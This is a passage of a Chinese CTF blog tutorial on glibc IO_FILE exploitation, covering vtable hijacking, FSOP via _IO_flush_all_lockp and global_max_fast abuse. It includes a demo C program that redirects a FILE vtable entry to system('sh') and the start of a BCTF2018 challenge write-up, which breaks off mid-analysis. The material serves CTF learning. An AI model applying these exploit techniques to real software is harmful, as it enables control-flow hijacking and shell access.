class="hljs-string">&#x27;_old_offset&#x27;</span>,<br>        <span class="hljs-number">0x80</span>:<span class="hljs-string">&#x27;_cur_column&#x27;</span>,<br>        <span class="hljs-number">0x82</span>:<span class="hljs-string">&#x27;_vtable_offset&#x27;</span>,<br>        <span class="hljs-number">0x83</span>:<span class="hljs-string">&#x27;_shortbuf&#x27;</span>,<br>        <span class="hljs-number">0x88</span>:<span class="hljs-string">&#x27;_lock&#x27;</span>,<br>        <span class="hljs-number">0x90</span>:<span class="hljs-string">&#x27;_offset&#x27;</span>,<br>        <span class="hljs-number">0x98</span>:<span class="hljs-string">&#x27;_codecvt&#x27;</span>,<br>        <span class="hljs-number">0xa0</span>:<span class="hljs-string">&#x27;_wide_data&#x27;</span>,<br>        <span class="hljs-number">0xa8</span>:<span class="hljs-string">&#x27;_freeres_list&#x27;</span>,<br>        <span class="hljs-number">0xb0</span>:<span class="hljs-string">&#x27;_freeres_buf&#x27;</span>,<br>        <span class="hljs-number">0xb8</span>:<span class="hljs-string">&#x27;__pad5&#x27;</span>,<br>        <span class="hljs-number">0xc0</span>:<span class="hljs-string">&#x27;_mode&#x27;</span>,<br>        <span class="hljs-number">0xc4</span>:<span class="hljs-string">&#x27;_unused2&#x27;</span>,<br>        <span class="hljs-number">0xd8</span>:<span class="hljs-string">&#x27;vtable&#x27;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="vtable"><a class="header-anchor" href="#vtable">¶</a>vtable</h3><p><strong>vtable</strong> 是干啥的？ vtable 指针指向的是 👴 这个 IOFILE 结构体对应的函数表，上调试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; p/x _IO_2_1_stdin_<br>$<span class="hljs-number">1</span> = &#123;<br>  file = &#123;<br>    _flags = <span class="hljs-number">0xfbad208b</span>,<br>    _IO_read_ptr = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_read_end = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_read_base = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_write_base = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_write_ptr = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_write_end = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_buf_base = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_buf_end = <span class="hljs-number">0x7ffb4188da84</span>,<br>...<br>    _lock = <span class="hljs-number">0x7ffb4188f8d0</span>,<br>    _offset = <span class="hljs-number">0xffffffffffffffff</span>,<br>    _codecvt = <span class="hljs-number">0x0</span>,<br>    _wide_data = <span class="hljs-number">0x7ffb4188dae0</span>,<br>    _freeres_list = <span class="hljs-number">0x0</span>,<br>    _freeres_buf = <span class="hljs-number">0x0</span>,<br>    __pad5 = <span class="hljs-number">0x0</span>,<br>    _mode = <span class="hljs-number">0xffffffff</span>,<br>    _unused2 = &#123;<span class="hljs-number">0x0</span> &lt;repeats <span class="hljs-number">20</span> times&gt;&#125;<br>  &#125;,<br>  vtable = <span class="hljs-number">0x7ffb4188a2a0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>上面是 stdin 结构体，下面是它的 vtable：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; p/x *_IO_2_1_stdin_.vtable<br>$<span class="hljs-number">3</span> = &#123;<br>  __dummy = <span class="hljs-number">0x0</span>,<br>  __dummy2 = <span class="hljs-number">0x0</span>,<br>  __finish = <span class="hljs-number">0x7ffb4152e330</span>,<br>  __overflow = <span class="hljs-number">0x7ffb4152f300</span>,<br>  __underflow = <span class="hljs-number">0x7ffb4152f020</span>,<br>  __uflow = <span class="hljs-number">0x7ffb415303c0</span>,<br>  __pbackfail = <span class="hljs-number">0x7ffb41531c50</span>,<br>  __xsputn = <span class="hljs-number">0x7ffb4152d930</span>,<br>  __xsgetn = <span class="hljs-number">0x7ffb4152d590</span>,<br>  __seekoff = <span class="hljs-number">0x7ffb4152cb90</span>,<br>  __seekpos = <span class="hljs-number">0x7ffb41530990</span>,<br>  __setbuf = <span class="hljs-number">0x7ffb4152c850</span>,<br>  __sync = <span class="hljs-number">0x7ffb4152c6d0</span>,<br>  __doallocate = <span class="hljs-number">0x7ffb41520100</span>,<br>  __read = <span class="hljs-number">0x7ffb4152d910</span>,<br>  __write = <span class="hljs-number">0x7ffb4152d190</span>,<br>  __seek = <span class="hljs-number">0x7ffb4152c910</span>,<br>  __close = <span class="hljs-number">0x7ffb4152c840</span>,<br>  __stat = <span class="hljs-number">0x7ffb4152d180</span>,<br>  __showmanyc = <span class="hljs-number">0x7ffb41531dd0</span>,<br>  __imbue = <span class="hljs-number">0x7ffb41531de0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>那么我在 stdin 相关的 IO 函数调用函数指针时就会从 stdin 的 vtable 里面查找相关的函数指针：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">   <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br> || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>     &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br> )<br>&amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)//如果输出缓冲区有数据，刷新输出缓冲区<br></code></pre></td></tr></table></figure><p>比如这个 <code>_IO_OVERFLOW</code> 就会顺着 👴 的 stdin 的 vtable 摸到 <code>__overflow = 0x7f3f23542790 &lt;_IO_new_file_overflow&gt;</code> 。</p><p>当然这里是<strong>调用不了</strong> <code>_IO_OVERFLOW</code> 的，因为 👴 还没 🐑 它，我只是举个例子说明一下。</p><h2 id="IO-list-all-指针"><a class="header-anchor" href="#IO-list-all-指针">¶</a>_IO_list_all 指针</h2><p>处于 libc 段的 _IO_list_all 指针记录着<strong>最近</strong>生成的 _IO_FILE_plus 结构体，通过单链表的形式把所有的 _IO_FILE_plus 结构体串联起来。值得注意的是通过河里的改写该指针，可以达到伪造 _IO_FILE 结构体的作用，为进一步的 🐑 做准备。</p><p>常用手法是 unsortdebin，Largebin 等 Attack 打 global_max_fast 改大 fastbin 的最大 size，在 _IO_list_all 写堆地址，当然直接对 _IO_list_all 冻手也是可以的，详细的后面会有例题。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/posts/20190627090036-f9501556-9876-1.png" alt=""></p><h2 id="IO调用的vtable函数"><a class="header-anchor" href="#IO调用的vtable函数">¶</a>IO调用的vtable函数</h2><p>在这里给出 <strong>raycp</strong> 师傅总结出的 <code>fopen</code>、<code>fread</code>、<code>fwrite</code>、<code>fclose</code>四个函数会调用的vtable函数。没错，我直接 CV 大师 👦，记不记得下来我不知道，以后起码翻起来方便很多。</p><p>fopen函数是在分配空间，建立FILE结构体，未调用vtable中的函数。</p><p>fread函数中调用的vtable函数有：</p><ul><li><code>_IO_sgetn</code>函数调用了vtable的<code>_IO_file_xsgetn</code>。</li><li><code>_IO_doallocbuf</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。</li><li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。</li><li><code>__underflow</code>函数调用了vtable中的<code>_IO_new_file_underflow</code>实现文件数据读取。</li><li>vtable中的<code>_IO_new_file_underflow</code>调用了vtable<code>__GI__IO_file_read</code>最终去执行系统调用read。</li></ul><p>fwrite 函数调用的vtable函数有：</p><ul><li><code>_IO_fwrite</code>函数调用了vtable的<code>_IO_new_file_xsputn</code>。</li><li><code>_IO_new_file_xsputn</code>函数调用了vtable中的<code>_IO_new_file_overflow</code>实现缓冲区的建立以及刷新缓冲区。</li><li>vtable中的<code>_IO_new_file_overflow</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。</li><li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。</li><li><code>new_do_write</code>中的<code>_IO_SYSWRITE</code>调用了vtable<code>_IO_new_file_write</code>最终去执行系统调用write。</li></ul><p><code>fclose</code>函数调用的vtable函数有：</p><ul><li>在清空缓冲区的<code>_IO_do_write</code>函数中会调用vtable中的函数。</li><li>关闭文件描述符<code>_IO_SYSCLOSE</code>函数为vtable中的<code>__close</code>函数。</li><li><code>_IO_FINISH</code>函数为vtable中的<code>__finish</code>函数。</li></ul><p>当然，IO 函数远不止这些。其他的 IO 函数内还有很多函数指针被调用了，被各位师傅们发掘出来的已经成了各大 <code>House</code> 了，剩下的只能说随缘看到了就看看能不能利用。</p><h2 id="FSOP-File-Stream-Oriented-Programming"><a class="header-anchor" href="#FSOP-File-Stream-Oriented-Programming">¶</a>FSOP(File Stream Oriented Programming)</h2><p><strong>FSOP</strong> 贯穿整个 IO 利用，👴 印象中带 OP 俩字不是 <strong>O泡</strong> 就是 <strong>导向编程</strong>。排除法得 FSOP 是可以实现类似 ROP 一样的<strong>控制流劫持</strong>的。</p><p><strong>FSOP</strong> 主要利用了 <strong>_IO_flush_all_lockp</strong> 函数，该函数的功能是刷新所有FILE结构体的输出缓冲区，先放一段代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>_IO_flush_all_lockp (<span class="hljs-type">int</span> do_lock)<br>&#123;<br>  <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *<span class="hljs-title">fp</span>;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  _IO_cleanup_region_start_noarg (flush_cleanup);<br>  _IO_lock_lock (list_all_lock);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>#遍历 _IO_list_all<br>  <span class="hljs-title function_">for</span> <span class="hljs-params">(fp = (_IO_FILE *) _IO_list_all; fp != <span class="hljs-literal">NULL</span>; fp = fp-&gt;_chain)</span><br>    &#123;<br>      run_fp = fp;<br>      <span class="hljs-keyword">if</span> (do_lock)<br>_IO_flockfile (fp);<br><br>      <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br>   || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>       &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br>   )<br>  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<span class="hljs-comment">//如果输出缓冲区有数据，刷新输出缓冲区</span><br>result = EOF;<br><br>      <span class="hljs-keyword">if</span> (do_lock)<br>_IO_funlockfile (fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  _IO_lock_unlock (list_all_lock);<br>  _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到关键在于它这里<strong>遍历</strong>了 <strong>_IO_list_all</strong> ，且调用了 <strong>_IO_OVERFLOW</strong> 这个 <strong>vtable</strong> 里面的函数。通过劫持这个函数，我们就可以玩一系列的操作。一般思路是在可控区域伪造一个结构体，塞入 <strong>_IO_list_all</strong> 这个链表里面（🐑 其他结构体的 <strong>_chain</strong> 指针或者直接 🐑 _IO_list_all 指针）。然后在伪造的结构体处劫持 vtable。</p><p>事实上，会<code>_IO_flush_all_lockp</code>调用函数的时机包括：</p><ul><li>libc执行abort函数时（内存错误）。别的师傅有写到 <strong>libc &lt; 2.26</strong> 有效，没具体试过。但是我们可以选择打 <strong>Kiwi</strong>。</li><li>程序显式调用 exit 函数时，<code>_exit</code> 不行。但是我们可以打 <strong>Kiwi</strong>。</li><li>程序从main函数返回时，结束时直接调 <code>syscall</code> 也不行。但是我们可以打 <strong>Kiwi</strong>。</li></ul><p>拿一张 CTF-Wiki 的图，虽然打印出了报错信息，还是执行了 <strong>_IO_OVERFLOW</strong> 这个函数。所以一顿操作直接打出了错误信息的同时<code>getshell</code> 或者 <code>orw flag</code> 都是基槽。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/abort_routine.001.jpeg" alt=""></p><p>看下上述三种情况的堆栈，来进一步了解程序的流程。将断点下在<code>_IO_flush_all_lockp</code>，查看栈结构。</p><h3 id="Abort-栈回溯"><a class="header-anchor" href="#Abort-栈回溯">¶</a>Abort 栈回溯</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_flush_all_lockp (do_lock=do_lock@entry=<span class="hljs-number">0x0</span>)<br>__GI_abort ()<br>__libc_message (do_abort=do_abort@entry=<span class="hljs-number">0x2</span>, fmt=fmt@entry=<span class="hljs-number">0x7ffff7ba0d58</span> <span class="hljs-string">&quot;*** Error in `%s&#x27;: %s: 0x%s ***\n&quot;</span>)<br>malloc_printerr (action=<span class="hljs-number">0x3</span>, str=<span class="hljs-number">0x7ffff7ba0e90</span> <span class="hljs-string">&quot;double free or corruption (top)&quot;</span>, ptr=&lt;optimized out&gt;, ar_ptr=&lt;optimized out&gt;)<br>_int_free (av=<span class="hljs-number">0x7ffff7dd4b20</span> &lt;main_arena&gt;, p=&lt;optimized out&gt;,have_lock=<span class="hljs-number">0x0</span>)<br>main ()<br>__libc_start_main (main=<span class="hljs-number">0x400566</span> &lt;main&gt;, argc=<span class="hljs-number">0x1</span>, argv=<span class="hljs-number">0x7fffffffe578</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="hljs-number">0x7fffffffe568</span>)<br>_start ()<br></code></pre></td></tr></table></figure><h3 id="exit-栈回溯"><a class="header-anchor" href="#exit-栈回溯">¶</a>exit 栈回溯</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_flush_all_lockp (do_lock=do_lock@entry=<span class="hljs-number">0x0</span>)<br>_IO_cleanup ()<br>__run_exit_handlers (status=<span class="hljs-number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=run_list_atexit@entry=<span class="hljs-number">0x1</span>)<br>__GI_exit (status=&lt;optimized out&gt;)<br>main ()<br>__libc_start_main (main=<span class="hljs-number">0x400566</span> &lt;main&gt;, argc=<span class="hljs-number">0x1</span>, argv=<span class="hljs-number">0x7fffffffe578</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="hljs-number">0x7fffffffe568</span>)<br>_start ()<br></code></pre></td></tr></table></figure><h3 id="正常退出栈回溯"><a class="header-anchor" href="#正常退出栈回溯">¶</a>正常退出栈回溯</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_flush_all_lockp (do_lock=do_lock@entry=<span class="hljs-number">0x0</span>)<br>_IO_cleanup ()<br>__run_exit_handlers (status=<span class="hljs-number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=run_list_atexit@entry=<span class="hljs-number">0x1</span>)<br>__GI_exit (status=&lt;optimized out&gt;)<br>__libc_start_main (main=<span class="hljs-number">0x400526</span> &lt;main&gt;, argc=<span class="hljs-number">0x1</span>, argv=<span class="hljs-number">0x7fffffffe578</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="hljs-number">0x7fffffffe568</span>)<br>_start ()<br></code></pre></td></tr></table></figure><p>看出来程序是在<strong>正常从main函数返回后</strong>，调用了<code>exit</code>函数，所以最终才调用<code>_IO_flush_all_lockp</code>函数的。所以如果用 <code>syscall</code> 结束那就不行。</p><p>常见的利用的方式为——</p><p>伪造IO FILE结构体，并利用漏洞将<code>_IO_list_all</code>指向伪造的结构体，或是将该链表中的一个节点（<code>_chain</code>字段）指向伪造的数据，再或者直接 🐑 掉原本的 IO 结构体。</p><p>最终触发<code>_IO_flush_all_lockp</code>，我们精心构造结构体绕过一堆检查，调用<code>_IO_OVERFLOW</code> 等函数时实现执行<strong>流劫持</strong>。意思是你可以合法地构造多个 <strong>_chain</strong> 把 IO <strong>摁在 exit 等函数退出前反复摩擦</strong>（笑）。 👴 就是爱了这一点。</p><p>其中绕过检查进入<code>_IO_OVERFLOW</code>的条件是输出缓冲区中存在数据：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xl"> <span class="hljs-function"><span class="hljs-title">if</span> (((fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">mode</span> &lt;= 0 &amp;&amp; fp-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_ptr</span> &gt; fp-&gt;</span>_IO_write_base)<br>#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T<br>     || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>         &amp;&amp; <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_<span class="hljs-function"><span class="hljs-title">mode</span> &gt; 0 &amp;&amp; (fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_write_ptr<br>            &gt; <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_write_base))<br></code></pre></td></tr></table></figure><p>这个伪造的话，我们只需要如下操作就可以绕过：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode &lt;= <span class="hljs-number">0</span><br>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<br></code></pre></td></tr></table></figure><hr><h1>利用艺术鉴赏</h1><h2 id="Libc-2-23"><a class="header-anchor" href="#Libc-2-23">¶</a>Libc &lt;= 2.23</h2><h3 id="劫持-vtable"><a class="header-anchor" href="#劫持-vtable">¶</a>劫持 vtable</h3><p>这个很好理解，上面有说到 vtable 是一张不寻常的表，很多 io 相关函数都会调用它。那么 👴 只要劫持了 vtable， 🐑 掉某个 IO 函数中关键的函数指针，换成 👴 最爱的 system ，就能搞事情了。</p><h4 id="Demo"><a class="header-anchor" href="#Demo">¶</a>Demo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> system_ptr 0x7ffff7a52390;</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    FILE *fp;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *vtable_addr,*fake_vtable;<br><br>    fp=fopen(<span class="hljs-string">&quot;123.txt&quot;</span>,<span class="hljs-string">&quot;rw&quot;</span>);<br>    fake_vtable=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>);<br><br>    vtable_addr=(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fp+<span class="hljs-number">0xd8</span>);     <span class="hljs-comment">//vtable offset</span><br><br>    vtable_addr[<span class="hljs-number">0</span>]=(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fake_vtable;<br><br>    <span class="hljs-built_in">memcpy</span>(fp,<span class="hljs-string">&quot;sh&quot;</span>,<span class="hljs-number">3</span>);<br><br>    fake_vtable[<span class="hljs-number">7</span>]=system_ptr; <span class="hljs-comment">//xsputn</span><br><br>    fwrite(<span class="hljs-string">&quot;hi&quot;</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,fp);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个直接扬完了是因为 fwrite 调用了<code>_IO_new_file_xsputn</code> 这个函数，而 rdi 默认就是我们的 fp 结构体，所以最后的效果是 <code>system('sh\0');</code>。</p><h3 id="例题"><a class="header-anchor" href="#例题">¶</a>例题</h3><h4 id="baby-arena-BCTF2018-libc2-23"><a class="header-anchor" href="#baby-arena-BCTF2018-libc2-23">¶</a>baby_arena_BCTF2018 &lt;libc2.23&gt;</h4><p>题目可以<a href="https://github.com/caffelne/caffelne.github.io/tree/master/chals/IOFILE/baby_arena_BCTF2018">点击</a>下载或者去原文 <a href="https://fmyy.pro/2020/04/04/GMF/Global_Max_Fast/">肥猫嘤嘤’s 博客</a></p><h5 id="分析"><a class="header-anchor" href="#分析">¶</a>分析</h5><p>第一题就写详细点。菜单实现了 <code>allocate</code> ，<code>delete</code> ，<code>login</code> 三个功能。</p><p>漏洞点函数 <strong>login</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">login</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 *v0; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> num; <span class="hljs-comment">// eax</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  __int64 *v4; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v4 = &amp;user;<br>  <span class="hljs-keyword">if</span> ( flag )<br>  &#123;<br>    LODWORD(v0) = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;you are already login&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    flag = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input your name&quot;</span>);<br>    get_char(&amp;v3, <span class="hljs-number">16LL</span>);<br>    user = v3;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;choice type&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;0.clientele&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.admin&quot;</span>);<br>    num = get_num(<span class="hljs-string">&quot;1.admin&quot;</span>, <span class="hljs-number">16LL</span>);<br>    <span class="hljs-keyword">if</span> ( num )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( num != <span class="hljs-number">1</span> )<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      v0 = v4 + <span class="hljs-number">1</span>;<br>      *((_DWORD *)v4 + <span class="hljs-number">2</span>) = <span class="hljs-string">&#x27;imda&#x27;</span>;<br>      *((_WORD *)v0 + <span class="hljs-number">2</span>) = <span class="hljs-string">&#x27;n&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v0 = v4 + <span class="hljs-number">1</span>;<br>      v4[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;letneilc&#x27;</span>;<br>      *((_WORD *)v0 + <span class="hljs-number">4</span>) = <span class="hljs-string">&#x27;e&#x27;</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">int</span>)v0;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里有个溢出，可以覆写 v4 ，导致任意地址写 <code>admin</code> 或者 <code>clientele</code> 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">get_char(&amp;v3, <span class="hljs-number">16LL</span>);<br></code></pre></td></tr></table></figure><h5 id="Global-Max-Fast"><a class="header-anchor" href="#Global-Max-Fast">¶</a>Global_Max_Fast</h5><p>这里也顺带讲一下 <code>Global_Max_Fast</code> 这个玩意，x64 下这个东西通常为 <code>0x80</code> ，也就是我们平时看到的最大 fastbin 的大小。</p><p>利用点就在我们 free  🐑 掉一个 fastbin 范围内的堆块时，在 <strong>main_arena</strong> 的对应 size 的坑位会记录堆块的地址。但我们大小改的巨大的时候，坑位不够但是 glibc 这个笨比它又不懂，就会造成把 <strong>main_arena</strong> 往后的对应偏移位置的内容<strong>写成我们的堆块地址</strong>。</p><p>我们使用以下公式来计算出目标溢出位置，对应的需要构造的堆块 SIZE，其中的 delta 指的是溢出位置到 fastbinsY 首地址的差值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">chunk size = (delta * <span class="hljs-number">2</span>) + <span class="hljs-number">0x20</span><br></code></pre></td></tr></table></figure><p>我们需要 malloc 的大小：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">offset2size</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">assert</span> offset % <span class="hljs-number">8</span> == <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> (offset * <span class="hljs-number">2</span>) + <span class="hljs-number">0x10</span><br></code></pre></td></tr></table></figure><p>👴 愿称之为<strong>霸占你的坑位然后疯狂塞💩</strong>。无图言鸾：</p><p>一开始还没 free 的时候是这样的：</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220524175248002.png" alt="image-20220524175248002"></p><p>free 完之后是这样的：</p><p><img 